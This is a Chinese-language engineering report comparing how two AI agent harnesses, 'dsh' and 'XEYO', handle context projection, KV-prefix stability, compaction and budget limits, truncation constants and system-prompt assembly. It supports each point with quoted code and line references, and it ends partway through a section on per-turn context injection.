- **KV 保护是结构副产品**：surface `replace` 只改中间节点，头部前缀逐字节不动（`surface.ts:381-383`）；压缩 `summarize` **复用同一个 system prompt / tools / messages**（`compaction-basic/src/index.ts:229-231`）。
- 作者的显式约束（`compaction/README.md:160`）：compaction "shrinks derived history, never the system prompt, tools, or session prefix"。
- 其余不变量：`buildRequest` 用 frozen request（`agent.ts:485`）；`assistant/message` 不能带 `sourceEventSeqs`（`surface.ts:226-228`）；`tool/result` 替换仅改 content（`surface.ts:299-330`）。
- 投影自身的纪律（`surface.ts:96-102`）：「Do NOT re-add per-type framing … framing is caller-owned」——投影层**逐字透传**，不加装饰。

###### 4.2 XEYO：投影是显式 transform，靠游标保稳定

- 决定者：`compact.project(history, frozen_until)`（`engine/compact.py:125`），作用在 `as_api_messages` 之上。
- 稳定机制：`boundary = max(0, min(frozen_until, len))`，**未冻结消息不改写**（`compact.py:135,238`）；保尾 K 默认 3 轮（`keep_tail_cut`，`compact.py:95-114`）；C0 单条 tool_result 截断 8192 字符（`MAX_TOOL_RESULT_CHARS`，`compact.py:24`）。
- 作者的设计意图（`compact.py:5-6`）：「本函数不自行决定窗口，保证两次 C1/C2 之间投影字节稳定」。
- 增量 `project_incremental` 与全量投影**逐字节一致**（`compact.py:286-310`）——这是可测试的设计目标，不是巧合。
- 左段极简（`query_loop.py:822`「system 左段保持稳定」）。

###### 4.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 投影实现 | 事件 → surface → messages 纯函数 fold | 消息列表 → C0/C1 占位 transform |
| 前缀稳定靠 | 追加式结构（不动头） | `frozen_until` 游标 + 保尾区 + 左段极简 |
| 谁可以改写历史 | 只有压缩（在 lock bracket 内） | 只有 C1/C2 投影 |
| 是否显式关心 KV | 否（下沉到 provider 库的 cache 声明） | **是**（引擎层显式政策） |

> 注意：dsh 也**没有**在请求侧下发 `cache_control` 全局断点；它的 `cacheControlFormat`/`supportsLongCacheRetention` 是 `llm-pi-ai` 的**模型目录声明**，由第三方库（pi-ai）决定怎么用。XEYO 的 `system_prompt.py:46-48` 则是引擎作者手写的"Date/Model 刻意不进左段"。

---


> 来源：**R3 实现面·实现级对比** · 原节「3. 上下文投影与 KV 前缀保护：实现级」（源 L343–409）

##### 3. 上下文投影与 KV 前缀保护：实现级

###### 3.1 dsh：请求从日志整体重建，header 快照化

dsh 的投影不是一个「transform 函数」，而是**每 step 从头重建整个请求**（`agent.ts:353-362`）：

```ts
const { request, preparedCall } = await this.buildRequest(
  turn, step, assembly.tools, system, this.session.deriveMessages(),
  startsRequestSeries, surfaceGeneration, signal,
)
```

`buildRequest`（`:488-588`）的实现顺序值得逐步列出：

| 行 | 动作 |
|---|---|
| `:502-510` | 读 `session.requestHeader()` 得到**上次持久化的完整 header**；只恢复「本 loop 实例声明的 route」且未被 adapter 标记为默认的 `reasoningEffort` |
| `:512-521` | `seedConfig = deepFreeze(structuredClone(requestHeaderLogged ? requestProposal(persistedHeader) : {...route, reasoningEffort?, maxTokens?}))` —— **首次用 route，之后用「上一次 proposal」**（`requestProposal()` `:61-67` 先剥掉 adapter 派生字段） |
| `:522-526` | `dispatch.waterfall('agent/request', …, () => seedConfig)` —— 插件可在此改配置 |
| `:533-539` | `llm.prepareCall(proposedConfig, signal)`；`NO_ADAPTER` 时**容忍**（middleware 可能服务未注册路由），其余错误抛出 |
| `:542-547` | `canonicalHeader({ config, adapterDefaults?, system?, tools? })` —— **header = 配置 + 系统提示 + 工具 schema** |
| `:551-562` | 落 `request/header` 的四种 reason |
| `:565-576` | route/capacity 变化才落 `request/context` |
| `:579-586` | `markAgentLoopRequest(deepFreeze({...header.config, messages: boundaryMessages, system?, tools?, sessionId, signal}))` |

**「模型当时看到什么」的完整重建链**：`request/header`（system + tools + config）+ `deriveMessages()`（消息）+ `request/context`（窗口容量）。这就是为什么 `request/header` 的注释说它是 **log-only，最新快照即可重建**（`types.ts:338-347`）。

**四种 reason 的精确判据**（`agent.ts:549-562`）：

```ts
const startsSeries = startsRequestSeries || this.requestSurfaceGeneration !== surfaceGeneration
if (!this.requestHeaderLogged)                                        → reason: baseline === undefined ? 'initial' : 'resume'
else if (baseline === undefined || !headerEquals(baseline, header))   → reason: 'change'（且 startsSeries 时带 startsSeries:true）
else if (startsSeries)                                                → reason: 'series'
```

`requestSurfaceGeneration` 是 `session.surface.replaceGeneration`——**surface 被替换（压缩）会强制开新 series**，这是压缩后 KV 前缀必然失效的显式承认。

**KV 缓存的实际保障方式（与第二轮更正一致，此处给实现证据）**：
- dsh **没有**「工具面会话内冻结」的 memo。`systemPrompt.assemble()` 每次 `pre-step` 调一次（`agent.ts:242`），工具 provider 每次被重新求值（`system-prompt/src/index.ts:562-572`），`orderTools` 每次重排（`:598`）。工具面变化 → `header` 不等 → 落 `request/header reason:'change'` **并开新 series**——即**用日志如实记录前缀断裂，而不是阻止断裂**。
- 真正的缓存声明在 provider 层：`llm-pi-ai/catalog.ts:233` 的 `cacheControlFormat:'offer'`（第二轮已核实）。

###### 3.2 XEYO：显式 transform + 尾部追加

XEYO 的投影是「把 store 里的消息转成模型可发格式」的**显式函数**（`project_for_model` 一族，在 `prompt/` 与 `engine/` 内），与 dsh 的区别在于：

- **消息为单位**，不是事件为单位；
- **T_now 块一律尾插**，且 env_channel 档用「**仅存在于投影**」的伪造 tool 对（见 §6），保证**前缀逐字节不动**；
- **MEMORY.md 索引不在左段**（`system_prompt.py:6` 注释：「mutation 会弄废整段 KV 前缀」），改由 runtime 追加到投影 T_now 尾部；
- 左段刻意**不含 Date / Model / 工具名清单**（`system_prompt.py:46-49`）：「Date / Model 都不进左段：避免换日/换模型打爆 KV」。

**实现级对照**：

| 维度 | dsh | XEYO |
|---|---|---|
| 投影输入 | **事件序列**（48 类） | **消息序列** |
| 投影位置 | `Session.deriveMessages()`（每 step 调一次） | `project_for_model`（显式调用点） |
| 系统提示/工具变化 | 接受断裂 → 落 `request/header reason:'change'` + 新 series | 左段锁死三件套，**只 append 不替换** |
| 易变内容 | 走 `systemPrompt.context()` 动态 context，渲染成**一条 user 消息**尾插（`renderContextSections`/`joinContextSections`，`system-prompt/src/index.ts:287-306`） | 走 T_now 管线，env_channel 伪造 tool 对尾插 |
| 前缀断裂 | 有日志证据（header 事件） | 设计上避免；引擎自己保证尾部追加 |
| 压缩 | `surfaceOp:'replace'` 显式改 surface + `sourceEventSeqs` 举证 | C0/C1/C2 三档 + `compact_cursor` |

**一个有意思的实现级巧合**：dsh 的动态 context 也是「渲染成一条 user 消息」（`renderContextSnapshot` 产出 `Current runtime context. This snapshot supersedes earlier runtime-context snapshots.` 的正文，`system-prompt/src/index.ts:290`），也是尾插——但它**不伪装成工具结果**，而是真的 user 角色；XEYO 的 env_channel 恰恰是为了**脱离 user 角色**才发明伪造 tool 对（`t_now_strategy.py:5-12` 的 L2 事故注记）。

---


## 域 06 · 压缩与预算（含截断常量）

> 来源：**R2 设计面·设计级对比** · 原节「5. 压缩与预算」（源 L292–322）

##### 5. 压缩与预算

###### 5.1 dsh：压缩是 seam，双触发，可组合

- **触发**：自动注册于 `agent/pre-step` 的 pressure（`compaction-basic/src/index.ts:148`）+ `agent/request-error` 的 context-overflow（`CONTEXT_WINDOW_EXCEEDED_CODE`，`:180-184`）。阈值 `thresholdTokens = resolveCompactSpec(policy, contextWindow)`（`:304`），`totalTokens < threshold` 直接不压（`:305`）。
- **算法**：`selectCompactableRange` + `compactRegion` 把 surface 区间**替换为单个 summary 节点**（`compaction/src/index.ts:164`）；边缘必须 `toolPairingBalanced`（`:154`），否则不成对会破日志语义。
- **续接**：replace 落在 **lock bracket** 内，崩溃留孤儿锁**可检测**——`compaction/README.md:95` 的原话：「The replacement sits inside the lock bracket, so a crash … leaves a detectable orphaned lock rather than a `compaction/end` that falsely claims success.」`deriveMessages` 把 summary 渲染为 user 消息。
- **可组合性**（作者原话 `compaction-basic/index.ts:279-282`）：「Pruning is optional so compaction-basic remains independently composable.」
- **没有的东西**：**无 token 预算、无死线、无成本上限**。`ctx.tokenMeter` 是**启发式估算且仅用于重放测量**（`token-meter/src/estimate.ts:43` 用 `CHARS_PER_TOKEN`），`TokenUsage` 随 `assistant/message` 事件落库，无独立账本。

###### 5.2 XEYO：C0/C1/C2 三档确定性压缩 + 多重预算护栏

- **压缩**：C0（单条 tool_result 截断 8192）→ C1（占位/折叠）→ C2（LLM 摘要，**默认关**，仅首压前预热，`query_loop.py:836-847`）。压力触发：厂商上下文达 95% 强制 C2（`maybe_force_compact_on_pressure`，`:848-850`）。
- **预算**：`BudgetTracker`（`budget.py:100`）——`max_turns` 默认 256、`max_tool_calling` 默认 64（`budget.py:19-24`）、grace 3 轮（`:25`）、墙钟硬停**默认关**（`:37-44`）。
- 作者对该字段的定位（`budget.py:20-24`）：「真正的并发上限由编排层信号量控制…这里只是总执行数的高护栏」。
- 收尾窗：预算耗尽 → `forced_wrap_up` + `wrap_up` T_now 块 + `runtime_budget` 块。

###### 5.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 压缩触发 | pressure + context-overflow 双自动 | 压力阈值 + 显式 `/compact` |
| 压缩产物 | surface 区间 → 单个 summary 节点（可 replace） | 确定性占位（C0/C1）+ 可选 LLM 摘要（C2，默认关） |
| 崩溃语义 | lock bracket + 可检测孤儿锁 | 无锁；靠投影函数幂等 |
| 预算/死线 | **完全没有** | turn / tool / token / usd 四重 + 收尾窗 |
| token 计量 | 启发式，仅重放用 | 厂商权威 usage 为准，投影估算兜底（`query_loop.py:1276-1284`） |

**这是 XEYO 明显更强的一面**，且强在"可运营性"：一个要长期跑、要控成本的本地 Agent 必须有预算；dsh 作为 developer preview 的 harness 可以不关心钱。

---


> 来源：**R3 实现面·实现级对比** · 原节「4. 压缩与预算：实现级」（源 L410–457）

##### 4. 压缩与预算：实现级

###### 4.1 dsh：compaction 是 seam，触发是纯算术

**文件**：`packages/compaction/compaction-basic/src/config.ts`

```ts
// config.ts:144-152
const thresholdTokens = Math.floor(contextWindow * policy.thresholdRatio)
const retainTokens = policy.retainRatio !== undefined ? Math.floor(contextWindow * policy.retainRatio) : …
if (retainTokens >= thresholdTokens) {
  throw new Error(`… retain tokens (${retainTokens}) must be less than threshold tokens ${thresholdTokens}`)
}
```

- 触发阈值 = `contextWindow × thresholdRatio`（floor），保留目标 = `contextWindow × retainRatio`（floor），**保留必须小于阈值**（否则配置直接抛错）。
- `contextWindow <= 0` 或非整数 → 抛错（`:138-141`）。
- 配置键校验白名单 `'thresholdRatio'`（`config.ts:27`）——`KNOWN_KEYS` 之外的键会被诊断（`UnknownConfig` warning 可抑制）。
- 压缩产物是 `compaction/start` … `compaction/summary` … `compaction/end` 三段事件 + `compaction/prune`（4 个事件名，实测），UI 可据此渲染折叠卡片；surface 改写走 `SurfaceOp.replace`。
- 另有 `command-compact` 提供手动触发命令，`active` 集合防重入（`command-compact/src/index.ts:87-93`）。

###### 4.2 XEYO：C0/C1/C2 三档 + 预算门 + 收尾窗

**实测结构**：`engine/compact.py` 实现三档；`engine/budget.py` 的 `BudgetTracker` 提供 `prepare_next_turn()` 门（`query_loop.py:800` 处），返回 `False` 即产 `StoppedEvent(reason="budget"|"budget_usd")`。

`UsageEvent` 里的 `compact_cursor: int` 与 `c2_summary_chars: int`（`events.py:132-134`）是**压缩状态随用量事件外发**的实现证据——前端据此画压缩后的用量条。`ContextCompressionEvent(phase, source, context_tokens, context_limit)`（`events.py:139-146`）是**压缩生命周期事件**，`source` 区分 `automatic`/`manual`——即 XEYO 把「压缩开始/结束」做成了对外可见事件，dsh 则做成三类日志事件。

**预算相关常量（实测，来自 `query_loop.py`）**：

| 名称 | 值 | 位置 |
|---|---|---|
| 收尾配额默认 | 3（`XEYO_WRAP_QUOTA` 覆盖，`0` = 维持全禁语义） | `wrap_quota_from_env()` `:118-129` |
| `_LLM_MAX_ATTEMPTS` 上限 | `max(1, min(n, 5))` | `_llm_max_attempts()` `:263` |
| 重复提醒阈值 | `[3, 5, 8]` | `:765` 注释 |
| 零命中提示门槛 | 累计空结果 ≥2 | `:773` 注释 |

**实现级对照**：

| 维度 | dsh | XEYO |
|---|---|---|
| 触发判据 | `floor(contextWindow × thresholdRatio)` 纯算术，可配 | 三档 C0/C1/C2（确定性规则），见 `engine/compact.py` |
| 配置校验 | `retain < threshold` 否则抛错；未知键诊断 | 档位为代码常量 |
| 压缩对历史的作用 | 显式 `SurfaceOp.replace` + `sourceEventSeqs` 举证 | 游标（`compact_cursor`）推进 |
| 对外可见性 | `compaction/start|summary|prune|end` 四事件 | `ContextCompressionEvent(start|complete)` + UsageEvent 里的 `compact_cursor`/`c2_summary_chars` |
| 预算 | 无「预算」概念（只有 contextWindow） | `BudgetTracker` 门 + `budget_mirror` / `runtime_budget` T_now 块 + 收尾窗配额 |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§9 截断与压缩：逐常量」（源 L873–953）

##### §9 截断与压缩：逐常量

###### 9.1 dsh —— 三条独立预算链

**(a) 工具结果中间裁剪 `compaction-tool-result-pruner`**

```ts
export const PRUNE_MARKER = '\n\n[... tool result middle pruned ...]\n\n'
export const DEFAULTS = { thresholdChars: 8192, headChars: 4096, tailChars: 1024 }
```

- 三个键是**完整白名单**（`CONFIG_KEYS`），未知键 → 报错。
- 校验：`thresholdChars` 正整数；`headChars`/`tailChars` 非负整数；`headChars + codePointLength(PRUNE_MARKER) + tailChars ≤ thresholdChars`，否则抛错。
- 长度按 **Unicode code point** 计（`Array.from(text).length`），不劈代理对。

**(b) spill（超限则外部化）`spill-policy`**

| 项 | 值/行为 |
|---|---|
| 配置 | 仅 `maxInlineBytes`（UTF-8 字节） |
| 未配置 | **注册零插件**（真正的 no-op） |
| 配置非法（负数/小数） | **加载期抛错**，不留给每次调用（注释：bad config must fail the deployment, not the tool） |
| 触发 | 最终结果的 UTF-8 大小 > `maxInlineBytes` |
| 预览切割 | `headBytes = ceil(budget/2)`；`tailBytes = floor(budget/2)`（`TextRetainer({kind:'headTail', …})`） |
| 仅纯文本 | 任一非 text 块 → 原样不动 |
| 跳过 `read` | 模型面臂跳过 `read`（防 read→spill→read 循环）；日志臂仍压 |
| 失败语义 | **尽力而为**：无会话 owner / 无后端 / 存盘失败 → 记日志返回原结果；"**A spill failure must NEVER turn a successful tool call into an `isError`**" |
| 通知文案 | `(${omission} Full formatted result stored at: ${ref.locator}. ${ref.retrievalHint})` |
| 存储根 | `mkdtempSync(join(tmpdir(), 'dsh-spill-'))`，即前缀 `dsh-spill-` + 6 位随机 |

**(c) compaction（上下文压缩）`compaction-basic`**

| 常量 | 值 | 说明 |
|---|---|---|
| `DEFAULT_THRESHOLD_RATIO` | **0.8** | 请求压力占 contextWindow 比例 |
| `DEFAULT_RETAIN_RATIO` | **0.16** | 逐字保留的尾部比例 |
| `maxTokens` | **8192** | 摘要输出上限 |
| `compactionRetries` | **1** | 压缩重试 |
| `maxOverflowRetries` | **1** | 溢出重试 |
| `auto` | **true** | 自动压缩 |

- `thresholdTokens = floor(contextWindow * thresholdRatio)`
- `retainTokens = retainRatio === undefined ? floor(contextWindow * retainRatio) : retainTokens`
- **硬校验**：`retainTokens < thresholdTokens`；`retainRatio >= thresholdRatio` → 加载期抛错；`retainRatio` 与 `retainTokens` **互斥**。
- 保留形式三态：`{retainTokens}` / `{retainRatio}` / 继承 fallback。
- 可对 **(provider, model) 精确覆盖**（`modelPolicies`），重复键用 `\u0000` 拼名去重后报错。
- 压缩是**日志记录的事务**：`compaction/start` → `compaction/summary`（含 `shadowedRange`/`shadowedSeqs`/`shadowedTokenCount`/`provider`/`model`/`maxTokens`/`usage`/`llmStreamCall` 判别）→ `compaction/end`（可带 `error`）；另有一条不走 LLM 的 `compaction/prune`。
- 事务选项：`owner: 'current-turn' | null`（是否开括号）、`stability: 'whole-surface' | 'selected-span'`（异步摘要期间的 surface 关系必须存活）、`flush?`。
- 专用错误：`SurfaceChangedError`（摘要完成时边界已变）、`ManualCompactionError`、`toolPairingBalancedBefore/After`（工具配对平衡校验）。

###### 9.2 XEYO —— 两条预算链 + C0/C1/C2 三档

| 常量/机制 | 值 | 位置 |
|---|---|---|
| per-tool 输出预算默认 | **16000 字符** | `tools/meta.py` `output_budget` 注释 |
| 豁免值 | **0**（自带截断：Bash 的 raw→落盘 seam、Read 防回环） | `Bash`/`Read` 两条 |
| T_now 三层 | 6000 / 2500 / 21 | `pre_llm_inject.py` |
| 嵌套说明限窗 | 4000 | `NESTED_MAX_CHARS` |
| 收尾配额 | `XEYO_WRAP_QUOTA` 覆盖，**默认 3**；0 = 旧的全禁语义 | `query_loop.py:791` |
| 重复提醒阈值 | `[3, 5, 8]` | `RepeatCallGuard` |
| C2 首压前预热门槛 | `_C2_LLM_PREFETCH_MIN_MESSAGES` | `query_loop.py:840` |
| 压缩事件 | `ContextCompressionEvent{phase: start\|complete, source: automatic\|manual, context_tokens, context_limit}` | `msgtypes/events.py:138` |
| 压缩相关函数 | `pair_safe_cut` / `c2_cut_index` / `maybe_advance_aging_boundary` / `_aging_min_advance` / `_pair_ranges` | `memory/runtime.py:215-334` |

**工具配对保护**：`_pair_ranges`（配对区间）+ `pair_safe_cut`（**切割点必须落在配对边界**）+ `c2_cut_index`——与 dsh 的 `toolPairingBalancedBefore/After` 是同一问题的两种实现：**压缩不得拆散 tool_use↔tool_result 对**。

###### 9.3 截断/压缩字段级差异

| 维度 | dsh | XEYO |
|---|---|---|
| 工具结果裁剪 | 中间裁剪（头 4096 + marker + 尾 1024，阈值 8192） | 单阈值截断（per-tool 16000），**无头尾保留策略** |
| 超限外部化 | ✅ spill（落盘 + 定位符 + 取回指引） | ✅ Bash 自带 spill（`spilled` 字段上报）；`offload_read` 读回 |
| 外部化失败语义 | 绝不把成功调用变 `isError` | — |
| 上下文压缩 | ✅ 独立 seam + 事务 + 摘要 LLM + 精确到 (provider,model) 的策略 | ✅ C0/C1/C2 三档（确定性摘要，C2 LLM 摘要默认关） |
| 配对保护 | `toolPairingBalanced*` | `pair_safe_cut` |
| 预算单位 | token（`contextWindow × ratio`） | 字符（`len(b)`）+ token（`budget.over_token_budget()`） |
| 压缩可观测 | 4 个事件（start/summary/end/prune）+ `shadowedSeqs` | 1 个事件（phase: start/complete） |
| 保留策略可配 | ✅ 按模型精确覆盖 | ❌ |

---


## 域 07 · System Prompt 组装

> 来源：**R1 功能面·全量对比** · 原节「7. System Prompt 与「模型可见文本」策略」（源 L162–180）

##### 7. System Prompt 与「模型可见文本」策略

###### dsh
- 段注册表：`ctx.systemPrompt.section()` 按 `order` 排序（`core/system-prompt/src/index.ts:432-441`）；内置 `harness:identity`(−1000)、`deployment:persona`(0)、工具段 `TOOL_READ 1100`…`TOOL_SUBAGENT 2800`（`index.ts:121-152`）。
- 动态上下文单独序列（`context()`，`index.ts:77-84`）；`{{variable}}` **严格插值**，未定义即抛（`index.ts:309-346`）。
- **铁律**：*"Model-visible means logged"*（`architecture.md:111`）——任何进入请求的内容必须能从日志重建，runtime invariant 强制（`agent-loop/src/invariant.ts:21-54`）。
- **未见** KV 前缀缓存的显式断点（无 `cache_control`），也未做「静态段/动态段」显式切分——dsh 靠"把易变内容变成 session 事件"而不是靠 prompt 分区来保缓存。

###### XEYO
- 左段极简：`[IDENTITY, CWD, FENCE_POLICY]`（`prompt/system_prompt.py:65-69`）；Date/Model 刻意不进左段**保 KV 前缀**。
- `XEYO.md` 经 instructions 注入（`:119`）；身份句不含行为要求（`:23-25`）。
- **T_now 注入管线**（`prompt/pre_llm_inject.py`）：全部易变内容走此管线，默认声道 `env_channel`（伪造 `assistant(xeyo_env_notice) → tool_result` 对尾插，`t_now_strategy.py:4-8,29`）。
- **硬准入**：`T_NOW_BLOCK_HARD_CAP = 21`（`pre_llm_inject.py:826`）；预算 6000 / inventory 2500（`:812-813`）；每个 `tagged.append` 必须带 `# block: <名>` 且与登记表一一对应，`tests/test_t_now_block_registry.py` 机器执法。
- 现有 **20 块**（`pre_llm_inject.py:828-909`）：`continue`、`mode_instructions`、`wrap_up`、`runtime_budget`、`budget_mirror`、`multi_agent_hint`、`repeat_guard`、`nested_instructions`、`compact`、`mcp_required_warn`、`reconcile_events`、`peer_presence`、`file_conflict`、`browser_preview`、`runtime_mode_snapshot`、`agent_settlement`、`goal`、`resume_directive`、`pending_jobs`、`skill_preinvoke`。每块登记「为什么必须在上下文」+ 类别（directive/event/inventory）。

**对照**：dsh 用「日志可重建性」保证不偷偷给模型看东西；XEYO 用「白名单 + 预算硬顶 + 逐条理由」保证**不给模型看导演**。前者约束"可审计"，后者约束"内容性质"。**两者互补，不重叠。**

---


> 来源：**R2 设计面·设计级对比** · 原节「6. System Prompt 组装」（源 L323–355）

##### 6. System Prompt 组装

###### 6.1 dsh：段注册表 + 严格插值 + 独立动态上下文序列

- **静态段**：`ctx.systemPrompt.section()` 按 `order` 升序拼接（`core/system-prompt/src/index.ts:121-152` `SECTION_ORDERS`；装配 `:432-441`）。内置：`harness:identity`(−1000)、`deployment:persona`(0)、工具段 `TOOL_READ 1100` … `TOOL_SUBAGENT 2800`。
- **身份句极简**：`You are an AI agent powered by DeepSeek Harness.`（`:409-413`）。
- **动态上下文序列**：独立的 `context()`（`:77-84`、`:467-476`），渲染成单独一段 `Current runtime context…supersedes earlier…`（`:275-306`），夹在静态段之后——**易变内容与静态段物理分离**。
- **严格插值**：`{{variable}}` 未定义即抛（`:263-346`），作者原话「Malformed, unknown, or undefined references throw」——把 prompt 变量当**强契约**而非模板。
- **环境信息不注入**：全仓 grep `git status|process.platform|os.platform` 命中项全在测试与平台分支，**无一处进 prompt**；cwd/OS/日期都不在 system 左段。时间由 `context/time-context` 插件以**插件身份的 user 消息快照**注入（`time-context/src/index.ts:180-220`），且 opt-in + 按 `refreshIntervalMs` 节流。
- **每个注册返回 disposer**：`section/context/tools/variable` 注册都返回 Cordis effect（`:432/467/499/515`），插件卸载自动解绑。

###### 6.2 XEYO：左段锁死三件套 + 只 append 不替换

- 左段 `[IDENTITY, CWD, FENCE_POLICY]`（`prompt/system_prompt.py:23-25, 65-69`）；`XEYO.md` 经 instructions 注入（`:84-92, 119, 164`）。
- **显式保 KV 前缀**：注释明写 Date/Model **刻意不进左段**（`:46-48`，避免换日/换模型打爆前缀），需要时刻用 `getTime` 工具。`MEMORY.md` 索引也不进左段（模块 docstring `:6`）。
- `custom_system_prompt`/`append_system_prompt` **只 append 不可整段替换**（`:132-206`）。
- 装配 seam = `PromptAssembler` 的会话级 memo（`assembler.py:26-98`，键含 `instr_sig`）。
- **无 `{{var}}` 插值**——没有变量语法，也就没有"未定义即抛"这类契约。

###### 6.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 分段机制 | 注册表 + order 排序，插件可增删 | 硬编码左段 + append 区 |
| 动态内容位置 | 独立 runtime-context 快照（`supersedes` 语义） | 全部走 T_now 注入管线（不进 system） |
| 变量插值 | 严格，未定义即抛 | 无 |
| cwd / OS / 日期 | **全部不注入**，交给工具 | cwd 进左段；OS/日期/git 不进 |
| 保前缀手段 | 静态段/动态段物理分离 | 刻意省略易变字段 |

两者都"保前缀"，但 dsh 是**分离**（把易变内容挪出 system），XEYO 是**省略 + 收口到 T_now 管线**。

---


> 来源：**R3 实现面·实现级对比** · 原节「5. System Prompt 组装：实现级」（源 L458–547）

##### 5. System Prompt 组装：实现级

###### 5.1 dsh：段注册表 + 中央序号表 + 严格插值

**文件**：`packages/core/system-prompt/src/index.ts`（614 行）

**段位置由一张中央常量表独占**（`:121-152`），实测 **33 个具名槽位**：

```ts
const SECTION_ORDERS = {
  HARNESS_IDENTITY: -1000, HARNESS_SOURCE: -900, WEB_SURFACE: -800,
  DEPLOYMENT_PERSONA: 0, PLAN_POLICY: 500, TEAM_POLICY: 600, PTC_ONLY: 800,
  FILE_REFERENCE: 900,
  TOOL_BASH: 1000, TOOL_PWSH: 1010, TOOL_READ: 1100, TOOL_WRITE: 1200,
  TOOL_EDIT: 1300, TOOL_GLOB: 1400, TOOL_GREP: 1500, TOOL_JOBS: 1600,
  TOOL_PTY: 1700, TOOL_WEB_SEARCH: 2000, TOOL_WEB_FETCH: 2100, TOOL_LSP: 2200,
  TOOL_SESSION_QUERY: 2300, TOOL_GOAL: 2400, TOOL_CORDIS: 2500,
  TOOL_WORKFLOW: 2600, TOOL_RALPH: 2700, TOOL_SUBAGENT: 2800,
  TOOL_REPORT: 2900, TOOLS_SDK: 5000, DELIVERABLE_FILE_REFERENCES: 9000,
  STRUCTURED_OUTPUT: 9900,
} as const
const CONTEXT_ORDERS = { SANDBOX_POLICY: 110, APPROVAL_POLICY: 115, SUBAGENT_DELEGATION: 120 } as const
```

**排序规则**（`:227-229`）：`a.order - b.order || compareNames(a.name, b.name)`——**同序号按名字（code-unit 序，locale 无关）**，保证跨机器一致。

**变量插值是严格的、会抛错的**（`interpolate()` `:309-346`）：
- 名字必须匹配 `/^[a-z][a-z0-9_]*$/`（`:175`），否则**抛错**；
- 未注册的名字抛错，且**用 `Object.hasOwn` 防 `Object.prototype` 穿透**（`:334` 注释「Do not resolve unregistered names through Object.prototype」）；
- 已注册但值为 `undefined` → **抛错**（不是空串）；
- 单个 `{{` 后面没有 `}}` → 当**字面散文**保留（`:320-326`）；
- 替换进去的值**不再二次扫描**（`:258`）。

**`complete` 段机制**（`:67-73`, `:574-586`）：标了 `complete: true` 的段会**作为唯一 system 段生效**，但 assembly 仍跑完 waterfall（让工具/上下文/变量能解析）；**两个 complete 段同时生效 → assembly 失败并列出名字**。

**工具排序**（`orderTools()` `:205-219`）：
- 工具名 `'<unlisted-tools>'`（`TOOL_ORDER_REST` `:181`）是保留字，工具 provider 返回它就抛错（`:206-209`）；
- 未配置 `toolOrder` → 按名字字典序（`:210`）；
- 配置了 → **未知名字抛错并列出全部已知名**（`:211-214`），未列出的按序插到 rest 位置；
- validation 用**限制前的名字全集**（`knownNames`，`:569-572`），因为 provider 可能报出在本 scope 被隐藏的工具名。

**动态 context 渲染**（`:287-306`）：

```ts
export function joinContextSections(sections: readonly ContextSnapshotSection[]): string {
  const body = sections.map(section => section.text).join('\n\n')
  if (body.length === 0) return ''
  return `Current runtime context. This snapshot supersedes earlier runtime-context snapshots.\n\n${body}`
}
```

**「supersedes」是关键词**——每次全量重发一份快照，靠这句话声明旧快照作废。`renderContextSections` 同时保留**具名分片**供 UI 归因（`:293-301`）。

**分层与作用域**：`ScopedLayers`（`:398-401`）——global 层 + 按 scope 链；**离得最近的 scope 覆盖同名**（变量 `:546-551`，段与 context 走 `this.layers.merge(scope, …)` `:553-554`）。每次注册/注销发 `system-prompt/change`（`:400`）。

**默认装配**（构造器 `:404-422`）：`harness:identity` 段（`includeHarnessIdentity` 默认 true，文本 `"You are an AI agent powered by DeepSeek Harness."`）+ `PERSONA_SECTION = 'deployment:persona'`（order 0，可由 preset 同名覆盖）。`includeRuntimeContext` 默认 true，关闭走 `suppressRuntimeContext()`。

###### 5.2 XEYO：左段锁死三件套

**文件**：`python/prompt/system_prompt.py`（217 行）

```python
IDENTITY = "你是 XEYO，桌面与微信场景下的编程助手。"

def get_default_system_prompt_parts(*, cwd, model, tool_names, date_iso=None) -> list[str]:
    if side_mode():
        return [IDENTITY, FENCE_POLICY]
    return [IDENTITY, f"CWD: {cwd}", FENCE_POLICY]
```

- **左段就这三段**；`model` / `date_iso` / `tool_names` 收了参数但**显式 `_ = tool_names, model, date_iso` 丢弃**（`:55`），注释给出原因：避免换日/换模型打爆 KV；工具名以 API `tools` schemas 为准。
- `custom_system_prompt` / `append_system_prompt` **只允许 append**；合并时**先剥掉可能误拼的重复身份句**（`:182-183`），且相同内容只留一次（`:184-185`）。
- 组装时把段分类成 `identity_env = defaults[:2]` + `rest`（`:146-147`），**XEYO.md instructions 插在两者之间**（`:163-164`），并给 breakdown 打 `soft_over` 标记（`:166-173`）。
- `assemble_system_prompt_parts` 返回 `(text, breakdown)`，breakdown 里每段带 `{category, label, chars}`——**为用量条的分类统计服务**（`:155`）。

**实现级对照表**：

| 实现维度 | dsh | XEYO |
|---|---|---|
| 段注册 | `systemPrompt.section({name, order, text, complete?})`，注册即发 change 事件 | 硬编码三段，无注册 API |
| 顺序 | 中央 33 槽位表 + 同序按名 | 数组字面顺序 |
| 段内容 | `string \| (ctx) => string`（每次 assembly 求值） | `string`（部分段是常量） |
| 变量 | `{{name}}` 严格插值，未注册即抛错 | 无变量系统 |
| 用户规则文件 | 无等价物（靠 `user/message` 注入 + skill） | **XEYO.md 进左段**（`# Instructions (XEYO.md)`），带软预算标记 |
| 动态上下文 | `systemPrompt.context()` 注册，渲染成**一条 user 消息**（带「supersedes」声明） | 走 T_now 管线（见 §6） |
| 工具排序 | 可配置 `toolOrder` + rest 占位，未知名抛错 | 按 schema 数组顺序，无排序配置 |
| 身份句 | `harness:identity` 段，可关 | `IDENTITY` 常量；`Agent` 前缀共用的单一入口 |

---


## 域 08 · 逐轮注入管线（T_now）★XEYO 独有

> 来源：**R2 设计面·设计级对比** · 原节「6.5 逐轮注入管线：T_now vs「无治理」——两端差距最大的注意力机制」（源 L356–438）

##### 6.5 逐轮注入管线：T_now vs「无治理」——两端差距最大的注意力机制

这是 XEYO 唯一**有完整治理层**、dsh **完全没有对应物**的一处。因为它在 XEYO 侧本身就是"引擎铁律"的落地机制，值得单独立节。

###### 6.5.1 XEYO：双声道 + 硬准入 + 机器执法

**两条声道**（`prompt/t_now_strategy.py:1-21`）：

| 档 | 做法 | 语义 |
|---|---|---|
